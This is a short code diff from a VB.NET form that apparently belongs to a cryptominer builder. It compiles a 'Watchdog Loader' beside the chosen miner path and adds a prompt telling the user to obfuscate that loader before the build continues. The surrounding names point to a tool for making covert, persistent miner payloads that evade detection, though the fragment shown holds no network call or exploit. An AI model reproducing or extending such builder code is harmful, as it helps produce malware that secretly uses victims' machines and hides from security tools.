@@ -116,6 +116,9 @@ Public Class Form1
                         Codedom.LoaderCompiler(watchdogpath & ".exe", File.ReadAllBytes(watchdogpath & ".dll"))
 
                         If Codedom.LoaderOK Then
+                            If FA.toggleObfuscation.Checked Then
+                                MessageBox.Show("The Watchdog Loader has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".exe" & "). Press OK after you're done with obfuscating the Watchdog Loader.")
+                            End If
                             txtLog.Text = txtLog.Text + ("Compiled Watchdog loader!" + vbNewLine)
                             watchdogdata = File.ReadAllBytes(watchdogpath & ".exe")
                             File.Delete(watchdogpath & ".dll")
